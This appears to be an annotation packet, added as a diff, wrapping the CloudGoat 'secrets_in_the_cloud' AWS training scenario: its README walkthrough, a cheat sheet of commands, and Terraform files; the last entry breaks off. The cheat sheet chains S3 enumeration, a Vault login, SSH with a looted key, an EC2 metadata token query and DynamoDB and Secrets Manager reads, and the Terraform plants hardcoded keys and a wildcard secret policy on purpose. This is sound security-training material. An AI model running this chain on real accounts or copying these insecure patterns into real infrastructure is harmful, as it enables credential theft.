@@ -1,0 +1,205 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "007629a9fcfb4b4279cd342c28235e011000e525558e6f83b730d8ca50dc1c93",
+  "case_id": "cloudgoat:aws:secrets_in_the_cloud",
+  "role": "primary",
+  "annotator_id": "annotator_01",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:secrets_in_the_cloud",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "secrets_in_the_cloud",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/cheat_sheet.md"
+    ],
+    "terraform_file_count": 12,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/",
+    "review_score": 66,
+    "independence_group": "cloudgoat-scenario:secrets_in_the_cloud",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/README.md",
+      "member_sha256": "9e6031a999d2639cdbded1ce1aa3b1146b114869b0f51ea8be05a4edb89a36e6",
+      "bytes": 2403,
+      "content_kind": "md",
+      "text": "# Scenario: secrets_in_the_cloud\r\n\r\n**Size:** Large\r\n\r\n**Difficulty:** Hard\r\n\r\n**Command:** `$ ./cloudgoat.py create secrets_in_the_cloud`\r\n\r\n## Resources\r\n\r\n* 1 Lambda\r\n* 1 EC2\r\n* 1 S3\r\n* 1 DynamoDB\r\n* 1 Secrets Manager Secret\r\n* 2 IAM Users\r\n\r\n## Start\r\n\r\n1. IAM User: low-priv-user\r\n\r\n## Goal\r\n\r\nFind the final secret in Secrets Manager.\r\n\r\n## Summary\r\n\r\nAs an IAM user with limited privileges, the attacker initiates their journey by examining AWS resources to uncover clues and hidden information. This investigation ultimately results in acquiring a role that grants access to the scenario's primary objective: retrieving the final secret from Secrets Manager. Please note that this walkthrough outlines the intended path for completing the scenario. However, alternative approaches may exist, and we would be delighted to learn about any unique methods used to reach the finish line.\r\n\r\n## Path\r\n\r\n![Path](./path.png)\r\n\r\n## Walkthrough\r\n\r\n1. As the IAM user \"low-priv-user\", the attacker explores the AWS environment, discovering an S3 bucket containing the URL to a web application hosted on an EC2 instance.\r\n2. The attacker enumerates the web application and uncovers an admin page that prompts for an API key.\r\n3. While examining the admin page's HTML comments, the attacker finds information about environment variables and a HashiCorp endpoint (located on port 8200 of the EC2 instance).\r\n4. By enumerating the scenario's Lambda function, the attacker locates the web application's API key and uses it to obtain the HashiCorp vault token.\r\n5. The attacker leverages the vault token to log in to the HashiCorp endpoint and acquires the id_rsa key, which grants SSH access to the EC2 instance hosting the web application.\r\n6. Intrigued by the login message, the attacker queries the EC2 metadata service and discovers that IMDSv2 is in use.\r\n7. The attacker queries the EC2 metadata service again, using a token in the header of the request to successfully obtain a response.\r\n8. After enumerating the EC2 metadata service, the attacker decides to list available DynamoDB tables and discovers a table containing IAM user credentials specific to the scenario.\r\n9. Utilizing the newly acquired IAM user credentials, the attacker retrieves the final secret from the Secrets Manager, successfully completing the scenario.\r\n\r\nA cheat sheet for the scenario is available [here](./cheat_sheet.md).\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/cheat_sheet.md",
+      "member_sha256": "033f9b67aa322dcd823435df3f904f999122b77f4d5e90c69c29c159ecf2a95e",
+      "bytes": 974,
+      "content_kind": "md",
+      "text": "```\r\nexport AWS_ACCESS_KEY_ID=[low-priv-user]\r\nexport AWS_SECRET_ACCESS_KEY=[low-priv-user]\r\n```\r\n\r\n`aws s3 ls`\r\n\r\n`aws s3 ls s3://[bucket]`\r\n\r\n`aws s3 cp s3://[bucket]/nates_web_app_url.txt .`\r\n\r\n`cat nates_web_app_url.txt`\r\n\r\n`aws lambda list-functions`\r\n\r\n`export VAULT_ADDR='http://[web_app_ip]:8200'`\r\n\r\n`vault login TorysTotallyTubular456`\r\n\r\n`vault kv get secret/id_rsa`\r\n\r\n`echo \"[id_rsa]\" >> id_rsa`\r\n\r\n`chmod 400 id_rsa`\r\n\r\n`ssh -i id_rsa ec2-user@[web_app_ip]`\r\n\r\n`TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")`\r\n\r\n`curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/info`\r\n\r\n`aws dynamodb list-tables`\r\n\r\n`aws dynamodb scan --table-name [table]`\r\n\r\n```\r\nexport AWS_ACCESS_KEY_ID=[secrets-manager-user]\r\nexport AWS_SECRET_ACCESS_KEY=[secrets-manager-user]\r\n```\r\n\r\n`aws secretsmanager list-secrets`\r\n\r\n`aws secretsmanager get-secret-value --secret-id [secret]`\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/manifest.yml",
+      "member_sha256": "993326e6c37a407b113f430ab7a97178b8f678ca35bad9b62cdb7c04187c901b",
+      "bytes": 844,
+      "content_kind": "yml",
+      "text": "# This 'manifest.yml' file provides configuration variables for the Cloudgoat scenario.\r\n---\r\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\r\n- name: secrets_in_the_cloud\r\n  # The name of the author(s), comma-separated\r\n- author: Morgan Backus (Rhino Security Labs)\r\n  # The version of the scenario, where major versions are breaking changes and minor are small fixes.\r\n- version: 1.1\r\n  # Text displayed to the user when they type \"{{ scenario_name }} help\"\r\n- help: |\r\n        Discover sensitive information stored in various AWS services. Use the discovered secrets to gain access to other resources and eventually escalate your privileges to gain control over the Secrets Manager.\r\n  # Records the date upon which this scenario was last updated, in MM-DD-YYYY format\r\n- last-updated: 05-23-2023\r\n...\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/data.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/data.tf",
+      "member_sha256": "3449b913ecf9c9f2311ba41543741ced4e0c4a1595dd214b4d71c93f3c303037",
+      "bytes": 586,
+      "content_kind": "tf",
+      "text": "data \"archive_file\" \"lambda_zip\" {\n  type        = \"zip\"\n  source_file = \"templates/lambda_handler.py\"\n  output_path = \"lambda_function_payload.zip\"\n}\n\ndata \"aws_ami\" \"amazon_linux_2\" {\n  most_recent = true\n\n  filter {\n    name   = \"name\"\n    values = [\"amzn2-ami-hvm-*-x86_64-gp2\"]\n  }\n\n  filter {\n    name   = \"architecture\"\n    values = [\"x86_64\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n\n  filter {\n    name   = \"root-device-type\"\n    values = [\"ebs\"]\n  }\n\n  filter {\n    name   = \"ena-support\"\n    values = [\"true\"]\n  }\n\n  owners = [\"amazon\"]\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/dynamodb.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/dynamodb.tf",
+      "member_sha256": "252a168f8955968e34095a8167bc113758c989dff4feb025d1978326888e537e",
+      "bytes": 1221,
+      "content_kind": "tf",
+      "text": "# This is a Terraform file that creates three resources:\n# 1. An AWS DynamoDB Table\n# 2. An AWS DynamoDB Entry (for the Access ID)\n# 3. An AWS DynamoDB Entry (for the Secret Key)\n\nresource \"aws_dynamodb_table\" \"secrets_table\" {\n  name         = \"secrets-table-${local.cgid_suffix}\"\n  billing_mode = \"PAY_PER_REQUEST\"\n  hash_key     = \"key\"\n\n  attribute {\n    name = \"key\"\n    type = \"S\"\n  }\n\n  # Enable server-side encryption using the default AWS KMS key\n  server_side_encryption {\n    enabled = true\n  }\n\n  tags = {\n    Name = \"secrets_table\"\n  }\n}\n\nresource \"aws_dynamodb_table_item\" \"access_key_id\" {\n  table_name = aws_dynamodb_table.secrets_table.name\n  hash_key   = aws_dynamodb_table.secrets_table.hash_key\n\n  item = jsonencode({\n    key = {\n      S = \"secrets_manager_user_key_id\"\n    }\n    value = {\n      S = aws_iam_access_key.secrets_manager_user_key.id\n    }\n  })\n}\n\nresource \"aws_dynamodb_table_item\" \"secret_access_key\" {\n  table_name = aws_dynamodb_table.secrets_table.name\n  hash_key   = aws_dynamodb_table.secrets_table.hash_key\n\n  item = jsonencode({\n    key = {\n      S = \"secrets_manager_user_key_secret\"\n    }\n    value = {\n      S = aws_iam_access_key.secrets_manager_user_key.secret\n    }\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/ec2_instance.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/ec2_instance.tf",
+      "member_sha256": "17495b77454141f25d3682226116c6cd90c889489a13f38f9de8276b4e3c1a31",
+      "bytes": 2045,
+      "content_kind": "tf",
+      "text": "# This is a Terraform file that creates several AWS EC2 resources:\n# 1. A Data Source for an AWS Amazon Machine Image.\n# 2. A TLS Private Key Resource\n# 3. An AWS Key Pair Resource\n# 4. An AWS Instance Resource\n# 5. An AWS Security Group Resource\n\nresource \"tls_private_key\" \"id_rsa\" {\n  algorithm = \"RSA\"\n  rsa_bits  = 2048\n}\n\nresource \"aws_key_pair\" \"id_rsa\" {\n  key_name   = \"idrsa-keypair\"\n  public_key = tls_private_key.id_rsa.public_key_openssh\n}\n\nresource \"aws_instance\" \"web_app\" {\n  ami           = data.aws_ami.amazon_linux_2.id\n  instance_type = \"t3.micro\"\n  key_name      = aws_key_pair.id_rsa.key_name\n  subnet_id     = aws_subnet.subnet.id\n\n  vpc_security_group_ids = [\n    aws_security_group.web_app_sg.id,\n  ]\n\n  user_data = base64encode(templatefile(\"templates/user_data.tpl\", {\n    aws_access_key_id     = aws_iam_access_key.secrets_manager_user_key.id,\n    aws_secret_access_key = aws_iam_access_key.secrets_manager_user_key.secret,\n    private_key           = tls_private_key.id_rsa.private_key_pem,\n  }))\n\n  # This sets the EC2 instance's IAM instance profile to the Dynamo DB profile created in iam.tf\n  iam_instance_profile = aws_iam_instance_profile.dynamodb_instance_profile.name\n\n  metadata_options {\n    http_tokens   = \"required\"\n    http_endpoint = \"enabled\"\n  }\n\n  tags = {\n    Name = \"CloudGoat Secrets in the Cloud Web App\"\n  }\n}\n\nresource \"aws_security_group\" \"web_app_sg\" {\n  name        = \"web_app_sg-${var.cgid}\"\n  description = \"Allow inbound traffic to the web app and Vault\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port   = 8080\n    to_port     = 8080\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  ingress {\n    from_port   = 8200\n    to_port     = 8200\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\" # -1 means all protocols\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/iam.tf",
+      "member_sha256": "c5cfca9f594b99cebefdeb9bcf2617fb6b3d59f058022da436847b5400c75af9",
+      "bytes": 4968,
+      "content_kind": "tf",
+      "text": "# This Terraform file creates several resources for AWS Identity and Access Management (IAM):\r\n# - An IAM User \r\n# - An IAM Access Key \r\n#\r\n#   For AWS Simple Storage Service (S3):\r\n#     - An IAM Policy \r\n#     - An IAM User Policy Attachment \r\n#\r\n#   For AWS Lambda:\r\n#     - An IAM Policy \r\n#     - An IAM User Policy Attachment \r\n#     - An IAM Role Policy\r\n#\r\n#   For AWS DynamoDB:\r\n#     - An IAM Policy \r\n#     - An IAM Role\r\n#     - An IAM Role Policy Attachment\r\n#     - An IAM Instance Profile\r\n#\r\n#   For AWS Secrets Manager:\r\n#     - An IAM User\r\n#     - An IAM Access Key\r\n#     - An IAM Role\r\n#     - An IAM User Policy\r\n\r\nresource \"aws_iam_user\" \"low_priv_user\" {\r\n  name = \"low-priv-user-${var.cgid}\"\r\n}\r\n\r\nresource \"aws_iam_access_key\" \"low_priv_user_key\" {\r\n  user = aws_iam_user.low_priv_user.name\r\n}\r\n\r\nresource \"aws_iam_policy\" \"low_priv_user_s3_policy\" {\r\n  name        = \"low_priv_user_s3_policy-${var.cgid}\"\r\n  description = \"Policy to allow low_priv_user to list and read objects in the S3 bucket created by the scenario and list their user policies and policy attachments\"\r\n\r\n  policy = jsonencode({\r\n    Version = \"2012-10-17\"\r\n    Statement = [\r\n      {\r\n        Action   = \"s3:ListAllMyBuckets\"\r\n        Effect   = \"Allow\"\r\n        Resource = \"*\"\r\n      },\r\n      {\r\n        Action   = \"s3:ListBucket\"\r\n        Effect   = \"Allow\"\r\n        Resource = aws_s3_bucket.secrets_bucket.arn\r\n      },\r\n      {\r\n        Action   = \"s3:GetObject\"\r\n        Effect   = \"Allow\"\r\n        Resource = \"${aws_s3_bucket.secrets_bucket.arn}/*\"\r\n      },\r\n      {\r\n        Action = [\r\n          \"iam:ListUserPolicies\",\r\n          \"iam:GetUserPolicy\",\r\n          \"iam:ListAttachedUserPolicies\"\r\n        ]\r\n        Effect   = \"Allow\"\r\n        Resource = aws_iam_user.low_priv_user.arn\r\n      }\r\n    ]\r\n  })\r\n}\r\n\r\nresource \"aws_iam_user_policy_attachment\" \"low_priv_user_s3_attachment\" {\r\n  user       = aws_iam_user.low_priv_user.name\r\n  policy_arn = aws_iam_policy.low_priv_user_s3_policy.arn\r\n}\r\n\r\nresource \"aws_iam_policy\" \"low_priv_user_lambda_policy\" {\r\n  name        = \"low_priv_user_lambda_policy-${var.cgid}\"\r\n  description = \"Policy to allow low_priv_user to enumerate and invoke the Lambda function\"\r\n\r\n  policy = jsonencode({\r\n    Version = \"2012-10-17\"\r\n    Statement = [\r\n      {\r\n        Action   = \"lambda:ListFunctions\"\r\n        Effect   = \"Allow\"\r\n        Resource = \"*\"\r\n      },\r\n      {\r\n        Action   = \"lambda:InvokeFunction\"\r\n        Effect   = \"Allow\"\r\n        Resource = aws_lambda_function.this.arn\r\n      }\r\n    ]\r\n  })\r\n}\r\n\r\nresource \"aws_iam_user_policy_attachment\" \"low_priv_user_lambda_attachment\" {\r\n  user       = aws_iam_user.low_priv_user.name\r\n  policy_arn = aws_iam_policy.low_priv_user_lambda_policy.arn\r\n}\r\n\r\n\r\nresource \"aws_iam_user\" \"secrets_manager_user\" {\r\n  name = \"${var.cgid}-secrets-manager-user\"\r\n}\r\n\r\nresource \"aws_iam_access_key\" \"secrets_manager_user_key\" {\r\n  user = aws_iam_user.secrets_manager_user.name\r\n}\r\n\r\nresource \"aws_iam_user_policy\" \"secrets_manager_user_policy\" {\r\n  name = \"secrets-manager-policy-${var.cgid}\"\r\n  user = aws_iam_user.secrets_manager_user.name\r\n\r\n  policy = jsonencode({\r\n    Version = \"2012-10-17\"\r\n    Statement = [\r\n      {\r\n        Action = [\r\n          \"secretsmanager:ListSecrets\",\r\n          \"secretsmanager:DescribeSecret\",\r\n          \"secretsmanager:GetSecretValue\"\r\n        ]\r\n        Effect   = \"Allow\"\r\n        Resource = \"*\"\r\n      }\r\n    ]\r\n  })\r\n}\r\n\r\n\r\n# Is this even used?\r\nresource \"aws_iam_role\" \"secrets_manager_role\" {\r\n  name = \"secrets-manager-role-${var.cgid}\"\r\n\r\n  assume_role_policy = jsonencode({\r\n    Version = \"2012-10-17\"\r\n    Statement = [\r\n      {\r\n        Action = \"sts:AssumeRole\"\r\n        Effect = \"Allow\"\r\n        Principal = {\r\n          AWS = aws_iam_role.lambda_execution.arn\r\n        }\r\n      }\r\n    ]\r\n  })\r\n}\r\n\r\n\r\nresource \"aws_iam_role\" \"dynamodb_role\" {\r\n  name = \"DavesDancingDoolittle-role\"\r\n\r\n  assume_role_policy = jsonencode({\r\n    Version = \"2012-10-17\"\r\n    Statement = [\r\n      {\r\n        Action = \"sts:AssumeRole\"\r\n        Effect = \"Allow\"\r\n        Principal = {\r\n          Service = \"ec2.amazonaws.com\"\r\n        }\r\n      }\r\n    ]\r\n  })\r\n}\r\n\r\nresource \"aws_iam_policy\" \"dynamodb_policy\" {\r\n  name = \"dynamodb-policy\"\r\n\r\n  policy = jsonencode({\r\n    Version = \"2012-10-17\"\r\n    Statement = [\r\n      {\r\n        Effect   = \"Allow\"\r\n        Action   = \"dynamodb:*\"\r\n        Resource = aws_dynamodb_table.secrets_table.arn\r\n      },\r\n      {\r\n        Effect   = \"Allow\"\r\n        Action   = \"dynamodb:ListTables\"\r\n        Resource = \"*\"\r\n      }\r\n    ]\r\n  })\r\n}\r\n\r\nresource \"aws_iam_policy_attachment\" \"dynamodb_policy_attachment\" {\r\n  name       = \"dynamodb-policy-attachment\"\r\n  roles      = [aws_iam_role.dynamodb_role.id]\r\n  policy_arn = aws_iam_policy.dynamodb_policy.arn\r\n}\r\n\r\nresource \"aws_iam_instance_profile\" \"dynamodb_instance_profile\" {\r\n  name = \"dynamodb-instance-profile\"\r\n  role = aws_iam_role.dynamodb_role.name\r\n}\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/lambda_function.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/lambda_function.tf",
+      "member_sha256": "462ca3045c164e1e25bc5e54a536a59f93ef75122abadd8432d2dcce9094248b",
+      "bytes": 1615,
+      "content_kind": "tf",
+      "text": "# This Terraform file creates the following AWS Lambda Resources:\n# - An AWS Lambda Resource\n# - An AWS IAM Role\n# - An AWS IAM Role Policy\n\nresource \"aws_cloudwatch_log_group\" \"lambda\" {\n  name              = \"/aws/lambda/cloudgoat-secrets-lambda-${var.cgid}\"\n  retention_in_days = 1\n  skip_destroy      = false\n}\n\nresource \"aws_lambda_function\" \"this\" {\n  function_name = \"cloudgoat-secrets-lambda-${var.cgid}\"\n\n  filename         = data.archive_file.lambda_zip.output_path\n  source_code_hash = data.archive_file.lambda_zip.output_base64sha256\n\n  runtime = \"python3.13\"\n\n  role    = aws_iam_role.lambda_execution.arn\n  handler = \"lambda_function.lambda_handler\"\n\n  logging_config {\n    log_format = \"JSON\"\n    log_group  = aws_cloudwatch_log_group.lambda.name\n  }\n\n  environment {\n    variables = {\n      API_KEY = \"DavidsDelightfulDonuts2023\"\n    }\n  }\n}\n\nresource \"aws_iam_role\" \"lambda_execution\" {\n  name = \"lambda_execution_role-${var.cgid}\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"lambda.amazonaws.com\"\n        }\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role_policy\" \"lambda_policy\" {\n  name = \"lambda-policy-${var.cgid}\"\n  role = aws_iam_role.lambda_execution.id\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = [\n          \"logs:CreateLogStream\",\n          \"logs:PutLogEvents\"\n        ]\n        Effect   = \"Allow\"\n        Resource = \"${aws_cloudwatch_log_group.lambda.arn}:log-stream:*\"\n      }\n    ]\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/locals.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/locals.tf",
+      "member_sha256": "480a6583b960bebb540f9630fc7623e8aca5052156512612886a95d53a30ca85",
+      "bytes": 300,
+      "content_kind": "tf",
+      "text": "locals {\n  # Ensure the suffix doesn't contain invalid characters\n  # Resources names can consist only of lowercase letters, numbers, dots (.), and hyphens (-).\n  # https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucketnamingrules.html\n  cgid_suffix = replace(var.cgid, \"/[^a-z0-9-.]/\", \"-\")\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/outputs.tf",
+      "member_sha256": "05113f5fdec13e7d9f2dcbb53f229aac6723fc53ac4575a5a7661a9459b82741",
+      "bytes": 509,
+      "content_kind": "tf",
+      "text": "# This Terraform file creates output values to expose information \r\n# about the infrastructure:\r\n# - A Low-Privilege Access Key\r\n# - A Low-Privilege Secret Key\r\n\r\noutput \"low_priv_access_key\" {\r\n  value       = aws_iam_access_key.low_priv_user_key.id\r\n  description = \"Access key ID for the low privilege IAM user.\"\r\n}\r\n\r\noutput \"low_priv_secret_key\" {\r\n  value       = aws_iam_access_key.low_priv_user_key.secret\r\n  description = \"Secret access key for the low privilege IAM user.\"\r\n  sensitive   = true\r\n}\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/provider.tf",
+      "member_sha256": "b303b8d297aa70cd9c448f14e1693d459f39e1734ff740a2d27ff78bafae4e7a",
+      "bytes": 507,
+      "content_kind": "tf",
+      "text": "terraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    archive = {\n      source  = \"hashicorp/archive\"\n      version = \">= 2.7.0\"\n    }\n\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n\n    tls = {\n      source  = \"hashicorp/tls\"\n      version = \">= 4.0.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n\nprovider \"tls\" {}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/s3_bucket.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/s3_bucket.tf",
+      "member_sha256": "69fa28567844c64aac24edd526df7163a0c5ba9c05f05e27d7efbd41cb51ee12",
+      "bytes": 529,
+      "content_kind": "tf",
+      "text": "# This Terraform file creates the following AWS Simple Storage Service Resources:\n# - An AWS S3 Bucket \n# - An AWS S3 Object\n\nresource \"aws_s3_bucket\" \"secrets_bucket\" {\n  bucket        = \"cg-secrets-bucket-${local.cgid_suffix}\"\n  force_destroy = true\n  tags = {\n    Description = \"CloudGoat ${var.cgid} S3 Bucket used for storing seekz.\"\n  }\n}\n\nresource \"aws_s3_object\" \"web_app_url\" {\n  bucket  = aws_s3_bucket.secrets_bucket.id\n  key     = \"nates_web_app_url.txt\"\n  content = \"http://${aws_instance.web_app.public_ip}:8080\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/secrets_manager.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/secrets_manager.tf",
+      "member_sha256": "8b0e1ed4ed6b28781706a13b396925d0eb7bda05e7663e36dfd17fdc0729130e",
+      "bytes": 1208,
+      "content_kind": "tf",
+      "text": "# This Terraform file creates the following resources for the AWS Secret's Manager:\n# - A variable containing a regular expression for the secrets suffix.\n# - An AWS Secret Manager Secret\n# - An AWS Secret Manager Secret Version\n# - An AWS Secret Manager Secret Policy\n\nresource \"aws_secretsmanager_secret\" \"this\" {\n  name        = \"cg-secret-${local.cgid_suffix}\"\n  description = \"A secret for CloudGoat scenario\"\n}\n\nresource \"aws_secretsmanager_secret_version\" \"this\" {\n  secret_id = aws_secretsmanager_secret.this.id\n  secret_string = jsonencode({\n    super_key                          = \"JohnsJuicyJam\"\n    mega_secret                        = \"BensBubblyBacon\"\n    ultra_mega_secret                  = \"BenjaminsBlazingBungee\"\n    RyansRambunctiousRhinocerosRampage = \"Congrats, you have successfully completed Secrets in the Cloud!\"\n  })\n}\n\nresource \"aws_secretsmanager_secret_policy\" \"this\" {\n  secret_arn = aws_secretsmanager_secret.this.arn\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action    = \"secretsmanager:GetSecretValue\"\n        Effect    = \"Allow\"\n        Resource  = aws_secretsmanager_secret.this.arn\n        Principal = \"*\"\n      }\n    ]\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/variables.tf",
+      "member_sha256": "f514ce91a28d7333c243237f41c9ce3277eee7cc13deec338852a0e385233318",
+      "bytes": 750,
+      "content_kind": "tf",
